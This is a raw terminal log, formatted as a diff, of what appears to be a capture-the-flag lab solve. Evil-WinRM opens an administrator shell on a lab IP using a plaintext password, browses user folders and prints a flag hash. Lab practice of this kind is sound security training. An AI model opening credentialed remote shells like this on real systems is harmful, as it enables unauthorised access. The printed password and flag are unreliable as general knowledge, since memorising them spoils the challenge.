@@ -1,0 +1,76 @@
+sudo evil-winrm -u administrator -p badminton -i 10.129.41.251
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        10/11/2020   7:19 AM                3D Objects
+d-r---        10/11/2020   7:19 AM                Contacts
+d-r---          3/9/2022   5:34 PM                Desktop
+d-r---         3/10/2022   4:51 AM                Documents
+d-r---        10/11/2020   7:19 AM                Downloads
+d-r---        10/11/2020   7:19 AM                Favorites
+d-r---        10/11/2020   7:19 AM                Links
+d-r---        10/11/2020   7:19 AM                Music
+d-r---         4/27/2020   6:01 AM                OneDrive
+d-r---        10/11/2020   7:19 AM                Pictures
+d-r---        10/11/2020   7:19 AM                Saved Games
+d-r---        10/11/2020   7:19 AM                Searches
+d-r---        10/11/2020   7:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd mike
+*Evil-WinRM* PS C:\Users\mike> ls
+
+
+    Directory: C:\Users\mike
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/10/2022   4:51 AM                Desktop
+
+
+*Evil-WinRM* PS C:\Users\mike> cd Desktop
+*Evil-WinRM* PS C:\Users\mike\Desktop> ls
+
+
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
+*Evil-WinRM* PS C:\Users\mike\Desktop> 
